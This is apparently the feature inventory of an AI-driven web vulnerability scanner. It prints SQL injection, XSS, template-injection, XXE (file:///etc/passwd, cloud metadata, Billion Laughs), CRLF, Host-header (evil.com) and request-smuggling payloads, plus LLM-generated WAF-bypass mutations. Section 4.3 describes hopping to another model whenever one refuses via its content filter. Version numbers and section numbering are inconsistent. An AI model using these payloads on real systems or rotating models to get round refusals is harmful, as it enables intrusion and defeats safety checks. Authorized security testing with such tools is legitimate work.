# Bugtraceai-CLI: Ultra-Detailed Feature Inventory

## Agentic Bug Bounty Framework | Version: 2.0.0 (Phoenix Edition) | Updated: 2026-01-08

---

## ⚠️ FRAMEWORK PHILOSOPHY

BugtraceAI-CLI is an **Agentic Bug Bounty Framework** - not just a scanner. It uses AI to make intelligent decisions about attack vectors, but **consistency and reproducibility are paramount**.

> **If a vulnerability exists, it MUST be found on every scan.**

---

## DOCUMENT PURPOSE

This document provides an **exhaustive technical catalog** of all exploitation, reconnaissance, and verification capabilities implemented in bugtraceai-cli. Each feature is documented with:

- File location and line count
- Technical implementation details
- AI/LLM integration points
- Tool dependencies
- Configuration parameters

---

## 1. RECONNAISSANCE CAPABILITIES

### 1.1 Visual Web Crawling

**File**: `/bugtrace/tools/visual/crawler.py` (151 lines)

**Features**:

- **JavaScript Rendering**: Full Playwright integration for SPA/dynamic content
- **BFS Depth-Limited**: Breadth-first search with configurable max depth
- **URL Normalization**: Protocol standardization, port removal, fragment stripping
- **Scope Enforcement**: Strict same-domain checking with subdomain awareness
- **Attack Surface Extraction**: Captures all `<input>`, `<textarea>`, `<select>` elements

**Technical Details**:

```python
Implementation: Async generator pattern with queue-based traversal
URL Visited Tracking: Set-based deduplication with normalized URLs
SPA Wait Strategy: wait_until="domcontentloaded" + configurable SPA_WAIT_MS (default: 1000ms)
Scope Algorithm: Domain exact-match (target.netloc == link.netloc)
```

**Configuration**:

- `settings.MAX_DEPTH` (default: 2)
- `settings.MAX_QUEUE_SIZE` (default: 100)
- `settings.SPA_WAIT_MS` (default: 1000)
- `settings.TIMEOUT_MS` (default: 15000)

**Extracted Data**:

1. **URLs**: Absolute hrefs from all `<a>` tags
2. **Inputs**: Tag name, type, name, id, placeholder, current value
3. **Forms**: Implicit via input grouping by URL

**Memory Integration**:

```python
Results → memory_manager.store_crawler_findings({
    "urls": [...],
    "inputs": [{"url": ..., "details": {...}}]
})
```

---

### 1.2 AI-Powered Visual Analysis

**File**: `/bugtrace/agents/recon.py` → `run_loop()` Phase 0

**Features**:

- **Screenshot Analysis**: Captures page state via Playwright
- **Technology Stack Detection**: LLM identifies CMS, frameworks, libraries
- **Hidden Path Prediction**: Context-aware admin panel/API endpoint discovery

**Implementation**:

```python
Workflow:
1. browser_manager.capture_state(target)
   → Returns: {"screenshot": bytes, "html": str, "url": str}

2. llm_client.analyze_visual(screenshot, prompt)
   → Model: VISION_MODEL (default: qwen/qwen-2.5-vl-72b-instruct)
   → Prompt: "Security analysis: Identify tech stack, CMS, hidden paths"
   → Returns: "WordPress 5.8, potential /wp-admin, REST API at /wp-json"

3. Text analysis stored in temporary context for Phase 2
```

**AI Model Requirements**:

- Multimodal vision capability (image + text input)
- Reasoning ability for security context interpretation
- Hallucination tolerance (predicted paths are verified later)

---

### 1.3 Contextual Path Discovery

**File**: `/bugtrace/agents/recon.py` → `_generate_contextual_paths()`

**Features**:

- **Standard Critical Paths**: Hardcoded essentials (robots.txt, .env, .git/*)
- **LLM-Generated Paths**: Framework-specific admin panels, API docs

**Algorithm**:

```python
Input: Visual analysis text (e.g., "Magento 2.4 detected")
Process:
  1. Start with base paths: ["/robots.txt", "/.env", "/.git/config", "/admin", "/login"]
  2. LLM Prompt: "Based on '{analysis}', suggest 5 hidden paths (admin, API, dev)"
  3. Parse LLM output (line-by-line, filter lines starting with '/')
  4. Deduplicate and return combined list
Output: Unique paths (10-20 typically)
```

**Example Predictions**:

- **WordPress**: `/wp-admin`, `/wp-login.php`, `/wp-json/wp/v2/users`
- **Django**: `/admin`, `/api/`, `/__debug__/`
- **Laravel**: `/telescope`, `/horizon`, `/nova`

---

### 1.4 External Tool Integration - GoSpider

**File**: `/bugtrace/tools/external.py` → `run_gospider()`

**Features**:

- **Deep Crawling**: Go-based crawler with concurrency (10 workers)
- **Session Context**: Cookie forwarding from authenticated browser
- **Output Parsing**: Extracts URLs from structured GoSpider output

**Docker Command**:

```bash
docker run --rm trickest/gospider \
  -s <TARGET> \
  -d 2 \
  -c 10 \
  --quiet \
  --cookie "<COOKIE_STRING>"
```

**Integration Flow**:

```python
ReconAgent.run_loop() Phase 3:
  session_data = await browser_manager.get_session_data()
  spider_urls = await external_tools.run_gospider(target, cookies=session_data['cookies'])
  memory_manager.store_crawler_findings({"urls": spider_urls})
```

---

### 1.5 External Tool Integration - Nuclei

**File**: `/bugtrace/tools/external.py` → `run_nuclei()`

**Features**:

- **Template-Based Scanning**: 5000+ vulnerability templates
- **Severity Filtering**: Critical, High, Medium
- **JSON Output**: Structured finding format

**Docker Command**:

```bash
docker run --rm projectdiscovery/nuclei:latest \
  -u <TARGET> \
  -silent \
  -jsonl \
  -severity critical,high,medium \
  -H "Cookie: <SESSION_COOKIES>" \
  -H "User-Agent: BugtraceAI/1.0"
```

**Output Schema**:

```json
{
  "template-id": "cve-2021-44228",
  "info": {
    "name": "Apache Log4j RCE",
    "severity": "critical"
  },
  "matched-at": "https://example.com/api/v1/vulnerable",
  "type": "http"
}
```

**Integration**:

```python
findings = await external_tools.run_nuclei(target, cookies)
for finding in findings:
    dashboard.add_finding(finding['info']['name'], finding['matched-at'], finding['info']['severity'].upper())
```

---

## 2. EXPLOITATION CAPABILITIES

### 2.1 SQL Injection Detection

**File**: `/bugtrace/tools/exploitation/sqli.py` (177 lines)

**Techniques**:

#### 2.1.1 Error-Based Detection

**Regex Patterns**:

- **MySQL**: `SQL syntax.*MySQL`, `mysql_fetch_array()`
- **PostgreSQL**: `PostgreSQL.*ERROR`, `pg_query()`, `unterminated quoted string`
- **MSSQL**: `Microsoft SQL Server`, `Unclosed quotation mark`, `SqlException`
- **Oracle**: `ORA-\d{5}`, `quoted string not properly terminated`

**Process**:

```python
1. Inject single quote (')
2. Check response body for error signatures
3. Confidence scoring: Full error match = 0.9, Partial = 0.6
```

#### 2.1.2 Boolean-Based Detection

**Payloads**:

- `' AND '1'='1` (True condition)
- `' AND '1'='2` (False condition)
- Compare response bodies for differential analysis

**Validation**:

```python
if len(response_true) != len(response_false):
    confidence = 0.8
    return {"suspicious": True, "type": "Boolean-Based"}
```

#### 2.1.3 Time-Based Detection

**Payloads**:

- `' OR SLEEP(5)--` (MySQL)
- `'; WAITFOR DELAY '00:00:05'--` (MSSQL)
- `' || pg_sleep(5)--` (PostgreSQL)

**Measurement**:

```python
start_time = time.time()
execute_request(url_with_payload)
duration = time.time() - start_time

if duration > 5.0:
    return {"confirmed": True, "type": "Time-Based"}
```

#### 2.1.4 Union-Based Detection

**Algorithm**:

```python
for column_count in range(1, 20):
    payload = f"' UNION SELECT {','.join(['NULL']*column_count)}--"
    response = execute(payload)
    if "SQL syntax" not in response and status_code == 200:
        return {"confirmed": True, "columns": column_count}
```

**Ladder Logic Integration**:

```python
# Light Check (Python)
result = await sqli_detector.detect(url)

if result['suspicious'] or result['confirmed']:
    # Heavy Check (SQLMap)
    if not settings.SAFE_MODE:
        await external_tools.run_sqlmap(url, cookies)
```

---

### 2.2 Cross-Site Scripting (XSS) Detection

**Files**:

- `/bugtrace/tools/exploitation/mutation.py` (Payload generation)
- `/bugtrace/tools/visual/browser.py` (Verification)

#### 2.2.1 Reflection Detection

**Baseline Payloads**:

```javascript
<script>alert(1)</script>
"><img src=x onerror=prompt(1)>
<svg/onload=alert(1)>
javascript:alert(document.domain)
```

**Process**:

```python
1. Inject payload into all input parameters
2. Check response HTML for unescaped payload
3. If found → Mark as "Reflected XSS Candidate"
```

#### 2.2.2 DOM-Based Detection

**Dynamic Analysis**:

```python
await browser_manager.verify_xss(url, expected_message=None)
# Monitors for:
# - dialog events (alert, prompt, confirm)
# - console.error messages
# - DOM modifications (innerHTML injection)
```

#### 2.2.3 AI-Powered Mutation

**File**: `/bugtrace/tools/exploitation/mutation.py`

**Strategy Shifting**:

```python
strategies = [
    "Advanced Evasion (Polyglots/Event Handlers)",
    "Contextual Blending (Native JS/HTML)",
    "Encoding/Obfuscation Shift",
    "Minimalist Bypass"
]

For each strategy:
    prompt = f"Mutate XSS payload '{original}' using {strategy}"
    mutated = await llm_client.generate(prompt)
    if validate_payload(mutated):
        return mutated
```

**Validation Rules**:

```python
def _validate_payload(payload):
    # Reject conversational text
    if any(trigger in payload.lower() for trigger in ["here is", "try this", "sorry"]):
        return False
    
    # Must contain attack characters
    if not any(c in payload for c in "<>'\";()${}\\"):
        return False
    
    return True
```

**Example Mutations**:

- **Original**: `<script>alert(1)</script>`
- **Strategy 1**: `<svg/onload=eval(atob('YWxlcnQoMSk='))>`
- **Strategy 2**: `<img src=x onerror="al\x65rt(1)">`
- **Strategy 3**: `<iframe src="javascript:alert(1)">`

---

### 2.3 Client-Side Template Injection (CSTI)

**File**: `/bugtrace/tools/exploitation/csti.py` (76 lines)

**Template Engine Payloads**:

#### 2.3.1 Jinja2 (Python/Flask/Django)

```python
Payloads = [
    "{{7*7}}",  # Should render as "49"
    "{{config}}",  # Attempts config disclosure
    "{{''.__class__.__mro__[1].__subclasses__()}}"  # RCE attempt
]
```

#### 2.3.2 Twig (PHP/Symfony)

```php
{{_self.env.display("path/to/file")}}
{{_self.env.getCache()}}
```

#### 2.3.3 Angular / AngularJS

```javascript
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
```

**Detection Algorithm**:

```python
1. Inject {{7*7}} in all inputs
2. Check if response contains "49" (or 49 as number)
3. If yes → Confirm CSTI
4. Template fingerprinting via error messages
```

---

### 2.4 XML External Entity (XXE) Injection

**File**: `/bugtrace/tools/exploitation/xxe.py` (85 lines)

**Payload Types**:

#### 2.4.1 File Disclosure

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

#### 2.4.2 SSRF (Internal Network Probing)

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
```

#### 2.4.3 Billion Laughs (DoS)

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>
```

**Detection**:

```python
# If response contains:
response.text.contains("root:x:0:0")  # File disclosure worked
response.text.contains("<ami-id>")     # SSRF to AWS metadata
```

---

### 2.5 Header Injection

**File**: `/bugtrace/tools/exploitation/header_injection.py` (124 lines)

**Attack Vectors**:

#### 2.5.1 CRLF Injection

```python
payloads = [
    "%0d%0aX-Injected: true",
    "%0aSet-Cookie: session=hijacked",
    "%0d%0a%0d%0a<script>alert('XSS')</script>"
]
```

**Detection**:

```python
response_headers = get_headers()
if "X-Injected" in response_headers or "Set-Cookie: session=hijacked" in raw_headers:
    return {"confirmed": True, "type": "CRLF Injection"}
```

#### 2.5.2 Host Header Poisoning

```python
headers = {"Host": "evil.com"}
response = await httpx.get(url, headers=headers)

if "evil.com" in response.text:  # Password reset link contains attacker domain
    return {"confirmed": True, "type": "Host Header Poisoning"}
```

---

### 2.6 HTTP Request Smuggling

**File**: `/bugtrace/tools/exploitation/proto.py` (62 lines)

**Techniques**:

#### 2.6.1 CL.TE (Content-Length vs Transfer-Encoding)

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

#### 2.6.2 TE.CL

```http
POST / HTTP/1.1
Transfer-Encoding: chunked
Content-Length: 4

5c
GPOST / HTTP/1.1
Host: evil.com
...
0
```

**Detection**:

```python
# Send ambiguous request
# Monitor for:
# - 403 Forbidden (WAF processed chunked)
# - Different status codes (CL vs TE confusion)
# - Timing delays (request queuing)
```

---

### 2.7 SQLMap Integration (Heavy Exploitation)

**File**: `/bugtrace/tools/external.py` → `run_sqlmap()`

**Features**:

- **Full Automation**: `--batch` flag (no prompts)
- **Session Awareness**: Cookie forwarding from browser
- **Risk/Level Control**: Configurable via `--level` and `--risk`
- **Output Parsing**: Regex extraction of vulnerable parameters

**Docker Command**:

```bash
docker run --rm googlesky/sqlmap:latest \
  -u "<URL>" \
  --batch \
  --random-agent \
  --level 1 \
  --risk 1 \
  --flush-session \
  --cookie="<SESSION_COOKIES>"
```

**Output Parsing**:

```python
# Example SQLMap output:
# "Parameter: id (GET)"
# "Type: boolean-based blind"

param_match = re.search(r"Parameter:\s+(.+?)\s+\(", output)
type_match = re.search(r"Type:\s+(.+?)\s", output)

if param_match and type_match:
    finding = {
        "parameter": param_match.group(1),
        "injection_type": type_match.group(1),
        "severity": "CRITICAL"
    }
```

---

---

### 2.8 Additional Specialized Agents (V4)

Features incorporated in the Advanced Reactive V4 update (2026-01-13).

#### 2.8.1 SSRF Agent (Server-Side Request Forgery)

**File**: `/bugtrace/agents/ssrf_agent.py`

**Target**: Parameters named `url`, `link`, `callback`, `webhook`, etc.

**Payloads**:

- Localhost targeting: `http://127.0.0.1`, `http://localhost`
- Protocol Smuggling: `file:///etc/passwd`
- OOB Interaction: `http://webhook.site/...`

**Detection**:

- Echoing of "SSRF Level" content.
- Leakage of `/etc/passwd` (root:x:0:0).

#### 2.8.2 XXE Agent (XML External Entity)

**File**: `/bugtrace/agents/xxe_agent.py`

**Target**: Endpoints consuming XML or `*.xml` paths.

**Attack**:

- Injects `<!DOCTYPE` with `SYSTEM` entities.
- Attempts file retrieval (`file:///etc/passwd`).

#### 2.8.3 IDOR Agent (Insecure Direct Object Reference)

**File**: `/bugtrace/agents/idor_agent.py`

**Target**: Numeric ID parameters (`id`, `user_id`, `invoice`).

**Strategy**:

- **Baseline**: Fetch original object (`id=100`).
- **Deviations**: Fetch `id-1` (99) and `id+1` (101).
- **Comparison**: Analyze response size and status to detect access control failure.

#### 2.8.4 JWT Agent (Integration)

**File**: `/bugtrace/agents/jwt_agent.py` (Now Integrated in Reactor)

**Target**: Parameters named `token`, `jwt`, `auth`.

**Attacks**:

- `None` Algorithm attack
- Header manipulation
- Weak secret brute-forcing

---

## 3. VERIFICATION & VALIDATION

### 3.1 Visual XSS Verification

**File**: `/bugtrace/tools/visual/browser.py` → `verify_xss()`

**Process**:

```python
1. Setup dialog handler:
   page.on("dialog", handle_dialog)
   
2. Navigate to URL with payload:
   await page.goto(vulnerable_url)
   
3. Wait for execution (3 seconds):
   await page.wait_for_timeout(3000)
   
4. Capture evidence:
   - Screenshot (PNG bytes)
   - Console logs (JavaScript errors)
   - Dialog triggered flag
   
5. Return verification bundle
```

**AI Vision Analysis**:

```python
# In SkepticalAgent.verify_vulnerability()
with open(screenshot_path, 'rb') as f:
    image_data = f.read()

prompt = '''
Senior Security Auditor Task:
Analyze this XSS alert screenshot.
Questions:
1. Is alert dialog clearly visible?
2. Does alert message prove execution on target domain?
3. Any sandboxing evidence?

Reply: VERIFIED / POTENTIAL_SANDBOX / UNRELIABLE
'''

analysis = await llm_client.analyze_visual(image_data, prompt)

if "VERIFIED" in analysis.upper():
    # Mark as confirmed vulnerability
```

**Rejection Criteria**:

- Alert from different origin (sandboxing)
- Alert message doesn't match expected payload
- AI model flags as unreliable/ambiguous

---

### 3.2 Manipulator Orchestrator

**File**: `/bugtrace/tools/manipulator/orchestrator.py` (75 lines)

**Responsibility**: Systematic HTTP mutation campaign

**Architecture**:

```python
ManipulatorOrchestrator
├── RequestController (HTTP execution + rate limiting)
├── PayloadAgent (XSS/SQLi payload generation)
└── EncodingAgent (WAF bypass transformations)
```

**Campaign Flow**:

```python
async def process_finding(base_request, strategies):
    # Phase 1: Payload Injection
    async for mutation in payload_agent.generate_mutations(base_request):
        if await _try_mutation(mutation):
            return True  # Exploitation successful
        
        # Phase 2: WAF Bypass
        if MutationStrategy.BYPASS_WAF in strategies:
            async for encoded in encoding_agent.generate_mutations(mutation):
                if await _try_mutation(encoded):
                    return True
    
    return False
```

**Response Analysis**:

```python
async def _try_mutation(request):
    status, body, duration = await controller.execute(request)
    
    # WAF Detection
    if status in [403, 406, 429]:
        return False
    
    # Success Indicators
    if "alert(1)" in body and status < 400:
        return True  # XSS reflected
    if "root:x:0:0" in body:
        return True  # LFI/RCE
    if "SQL syntax" in body:
        return True  # SQLi error
    
    return False
```

---

## 4. ADVANCED FEATURES

### 4.1 WAF Detection

**File**: `/bugtrace/core/llm_client.py` → `detect_waf()`

**Process**:

```python
Input:
  - response_text: Full HTTP response body
  - response_headers: HTTP headers as string

LLM Prompt:
  "Analyze this HTTP response. Identify WAF type (Cloudflare, ModSecurity, AWS WAF, Imperva).
   Look for:
   - Blocked status codes (403, 406)
   - WAF-specific headers (cf-ray, x-amz-waf)
   - Challenge pages (CAPTCHA, JS challenge)
   Reply ONLY with WAF name or 'None'."

Output: "Cloudflare" / "ModSecurity" / "None"
```

**Integration**:

```python
# In ExploitAgent._check_waf()
waf_type = await llm_client.detect_waf(response.text, str(response.headers))

if waf_type != "None":
    dashboard.log(f"WAF Detected: {waf_type}", "WARNING")
    # Enable mutation engine with BYPASS_WAF strategy
```

---

### 4.2 Credit Tracking & Cost Management

**File**: `/bugtrace/core/llm_client.py` → `update_balance()`

**API Integration**:

```python
async def update_balance():
    url = "https://openrouter.ai/api/v1/auth/key"
    headers = {"Authorization": f"Bearer {api_key}"}
    
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as resp:
            data = await resp.json()
            self.current_balance = data['data']['limit'] - data['data']['usage']
            
            # Update dashboard
            dashboard.update_balance(self.current_balance)
            
            # Warn if low
            if self.current_balance < settings.MIN_CREDITS:
                logger.warning(f"Low credits: ${self.current_balance:.2f}")
```

**Session Cost Tracking**:

```python
self.session_cost = 0.0

# After each LLM call
tokens_used = response_data['usage']['total_tokens']
model_cost_per_1k = get_model_pricing(model)
call_cost = (tokens_used / 1000) * model_cost_per_1k
self.session_cost += call_cost

dashboard.update_session_cost(self.session_cost)
```

---

### 4.3 Model Shifting (Resilience)

**File**: `/bugtrace/core/llm_client.py` → `generate()`

**Algorithm**:

```python
models = parse_primary_models()  # From settings.PRIMARY_MODELS

for model in models:
    try:
        response = await openrouter_api_call(model, prompt)
        
        # Check for content filtering
        if "finish_reason" in response and response["finish_reason"] == "content_filter":
            logger.warning(f"{model} filtered content. Shifting...")
            continue
        
        # Success
        return response['choices'][0]['message']['content']
        
    except Exception as e:
        logger.error(f"{model} failed: {e}. Shifting to next...")
        continue

# All models failed
logger.critical("All models failed. Returning empty.")
return ""
```

**Shift Triggers**:

- HTTP 429 (rate limit)
- HTTP 503 (service unavailable)
- `content_filter` finish reason
- JSON parse errors
- Timeout errors

---

### 4.4 Memory Persistence & GraphRAG

**File**: `/bugtrace/memory/manager.py` (224 lines)

**Dual Storage**:

#### Knowledge Graph (NetworkX)

```python
# Structure
Nodes: {
    "URL:https://example.com": {type: "URL", properties: {...}},
    "Input:search_query": {type: "Input", properties: {...}},
    "Finding:XSS_01": {type: "Finding", severity: "CRITICAL"}
}

Edges: [
    ("URL:example.com", "Input:search_query", "contains"),
    ("Input:search_query", "Finding:XSS_01", "vulnerable_to")
]
```

**Persistence**:

```python
# Save to disk
nx.write_gml(self.graph, "data/memory_graph.gml")

# Load on startup
if os.path.exists(graph_path):
    self.graph = nx.read_gml(graph_path)
```

#### Vector Store (LanceDB)

```python
# Schema
{
    "id": str,           # "URL:example.com"
    "type": str,         # "URL"
    "label": str,        # "example.com"
    "properties": str,   # JSON dump
    "text": str,         # Searchable text
    "vector": List[float]  # 384-dim embedding
}

# Add node
embedding = sentence_transformer.encode(text)
table.add([{...}])

# Semantic search
results = table.search(query_vector).limit(5).to_list()
```

**Query Patterns**:

```python
# Get all untested inputs
inputs = memory_manager.get_attack_surface("Input")
untested = [i for i in inputs if i.get('status') != 'TESTED']

# Semantic search for similar findings
results = memory_manager.vector_search("SQL injection in login form", limit=5)
```

---

## 5. CONFIGURATION & CUSTOMIZATION

### 5.1 Model Configuration

**File**: `/bugtrace/core/config.py` + `bugtraceaicli.conf`

**[LLM_MODELS] Section**:

```ini
DEFAULT_MODEL = google/gemini-2.0-flash-thinking-exp:free
PRIMARY_MODELS = google/gemini-2.0-flash-thinking-exp:free,qwen/qwen-2.5-coder-32b-instruct,x-ai/grok-code-fast-1
VISION_MODEL = qwen/qwen-2.5-vl-72b-instruct
WAF_DETECTION_MODELS = anthropic/claude-3-haiku,meta-llama/llama-3-8b-instruct
CODE_MODEL = qwen/qwen-2.5-coder-32b-instruct
ANALYSIS_MODEL = x-ai/grok-code-fast-1
```

**Model Roles**:

- **DEFAULT_MODEL**: General-purpose reasoning (path prediction, mutation)
- **PRIMARY_MODELS**: Fallback sequence for resilience
- **VISION_MODEL**: Screenshot analysis (must support image input)
- **WAF_DETECTION_MODELS**: Specialized for WAF identification
- **CODE_MODEL**: Payload generation (coding-focused)
- **ANALYSIS_MODEL**: Response analysis (fast reasoning)

---

### 5.2 Scan Configuration

**[SCAN] Section**:

```ini
MAX_DEPTH = 2      # Crawler recursion depth
MAX_URLS = 25      # Maximum pages to crawl
```

**[CRAWLER] Section**:

```ini
SPA_WAIT_MS = 1000        # Wait for JavaScript hydration
MAX_QUEUE_SIZE = 100      # Prevent memory explosion
```

**[BROWSER] Section**:

```ini
HEADLESS = true           # Run browser in headless mode
```

**[BROWSER_ADVANCED] Section**:

```ini
USER_AGENT = Mozilla/5.0 ...
VIEWPORT_WIDTH = 1280
VIEWPORT_HEIGHT = 720
TIMEOUT_MS = 15000        # Page load timeout
```

---

## 6. SAFE MODE

**Configuration**: `settings.SAFE_MODE` (default: False)

**Behavior Changes**:

```python
if settings.SAFE_MODE:
    # Disable:
    - SQLMap execution (no active exploitation)
    - Mutation engine payload testing
    - Aggressive fuzzing
    
    # Enable only:
    - Visual crawling
    - Passive Nuclei scans (safe templates)
    - Error-based SQL detection (no blind/time-based)
```

**CLI Override**:

```bash
python -m bugtrace scan https://example.com --safe-mode
```

---

## 7. REPORTING FEATURES

### 7.1 HTML Report Generation

**File**: `/bugtrace/reporting/generator.py` (49 lines)

**Template**: `bugtrace/reporting/templates/report.html` (Jinja2)

**Sections**:

1. **Executive Summary** (AI-generated)
2. **Scan Metadata** (target, date, duration)
3. **Statistics Dashboard** (critical/high/medium counts)
4. **Findings Table** (severity, type, URL, proof)
5. **Visual Evidence** (embedded screenshots)
6. **Recommendations** (AI-generated remediations)

**AI Summary Generation**:

```python
prompt = f'''
Generate professional executive summary:
Target: {target}
Scan Duration: {duration}
Findings: {critical_count} critical, {high_count} high

Format:
## Overview
[2-3 sentences]

## Key Findings
- [Finding 1]
- [Finding 2]

## Recommendations
[Prioritized fixes]
'''

summary = await llm_client.generate(prompt, "ReportWriter")
```

---

### 7.2 Evidence Collection

**Screenshot Storage**:

```python
evidence_dir = f"evidence/{scan_id}/"
os.makedirs(evidence_dir, exist_ok=True)

screenshot_path = f"{evidence_dir}/xss_proof_{timestamp}.png"
await page.screenshot(path=screenshot_path)

# Store in finding
memory_manager.add_node("Finding", "XSS_01", {
    "screenshot_path": screenshot_path,
    "proof": analysis_text
})
```

**Links in Report**:

```html
<tr>
  <td>Reflected XSS</td>
  <td><a href="{{finding.url}}">{{finding.url}}</a></td>
  <td><img src="{{finding.screenshot_path}}" width="400"/></td>
</tr>
```

---

## 8. FEATURE STATISTICS

### Total Lines of Code (Updated 2026-01-08)

```text
Core Orchestration:     ~4,500 lines  (team.py: 1,284 + conductor.py: 471 + llm_client.py: 442 + ...)
Agents:                 ~5,970 lines  (xss_agent:980 + url_master:772 + analysis:671 + dast:550 + ...)
Skills:                 ~1,450 lines  (injection.py: 486 + advanced.py: 350 + external_tools.py: 280 + ...)
Tools (Visual):         ~600 lines    (browser.py: 385 + crawler.py: 150 + ...)
Tools (Exploitation):   ~500 lines    (mutation.py: 162 + sqli.py: 124 + manipulator/*: ~250)
Tools (External):       ~450 lines    (external.py + interactsh.py)
Memory/Database:        ~600 lines    (database.py: 302 + embeddings.py: 153 + memory.py: 123)
Reporting:              ~400 lines    (generator.py: 79 + models.py + templates)
Configuration/Utils:    ~500 lines    (config.py: 237 + logger.py + ...)
Total:                  ~16,663 lines (88 Python files)
```

### Exploitation Techniques Implemented

- **SQL Injection**: 4 detection methods (error, boolean, time, union)
- **XSS**: 3 types (reflected, DOM, stored detection patterns)
- **CSTI**: 3 template engines (Jinja2, Twig, Angular)
- **XXE**: 3 attack vectors (file, SSRF, DoS)
- **Header Injection**: 2 types (CRLF, Host poisoning)
- **HTTP Smuggling**: 2 techniques (CL.TE, TE.CL)

### External Tools Integrated

1. GoSpider (web crawler)
2. Nuclei (vulnerability scanner)
3. SQLMap (SQL injection)

### AI/LLM Features

- Visual screenshot analysis
- Hidden path prediction
- Payload mutation (4 strategies)
- WAF detection
- Report narrative generation
- Response analysis

---

## 9. UNIQUE DIFFERENTIATORS

1. **Vision-First Verification**: Only framework using multimodal LLMs for visual XSS proof validation
2. **Ladder Logic**: Progressive tool engagement (light → heavy) for cost optimization
3. **Model Shifting**: Automatic fallback across 3+ LLM providers
4. **Context-Aware Scanning**: Browser session cookies forwarded to all tools
5. **GraphRAG Memory**: Hybrid graph + vector storage for intelligent attack surface management
6. **Strategy Shifting**: Multiple mutation approaches with automatic validation
7. **Skeptical Agent**: Dedicated false-positive elimination role

---

### 5.4 Rapid Access Launch Script

**File**: `/bugtraceai-cli` (Bash Script)

**Features**:

- **Zero-Config Execution**: Automatically detects and activates the `.venv` or `venv` virtual environments.
- **Pass-through Arguments**: Forwards all CLI arguments and flags directly to the Python core.
- **Clean Execution**: Removes Python-specific boilerplate from the user terminal.

**Usage**:

```bash
./bugtraceai-cli [TARGET_URL] [OPTIONS]
```

---

## 6. v1.6.0 NEW FEATURES CATALOG

### 6.1 OpenTelemetry Tracing Engine

**File**: `/bugtrace/core/tracing.py`

**Capabilities**:

- **Granular Instrumenting**: Decorators `@trace_llm` and `@trace_skill` for real-time observability.
- **Stats Integration**: Automatic recording of LLM token usage, duration, and skill success rates.
- **Resilient Fallback**: Gracefully operates without OTEL dependencies if not installed.

### 6.2 Interactsh (OOB) Client

**File**: `/bugtrace/tools/interactsh.py`

**Capabilities**:

- **Invisible Bug Detection**: Detects Blind XSS, SSRF, and XXE via external callback servers.
- **Correlation ID Engine**: Maps every external ping back to a specific parameter and URL.
- **Payload Library**: Integration with `oast.fun` for OOB payload generation.

### 6.4 Reporting Agent (Phoenix Edition)

**File**: `/bugtrace/agents/reporting.py`

**Capabilities**:

- **AI Finding Enrichment**: Automatically generates Impact, Remediation, and CWE mapping for every confirmed vulnerability.
- **Artifact Consolidation**: Moves screenshots and logs into target-specific directories within `reports/`.
- **Interactive HTML Reporting**: Uses Jinja2 to generate `REPORT.html` with:
  - **Chart.js** distribution charts.
  - **Tailwind CSS** modern UI components.
  - **Evidence Lightbox** for visual proof.
  - **Copy-to-Clipboard** fuzzer payloads.

---
This feature inventory represents the **complete technical capability set** of bugtraceai-cli as of version 1.6.1 (Phoenix Edition). All features are production-ready and integrated into the vertical scanning workflow.
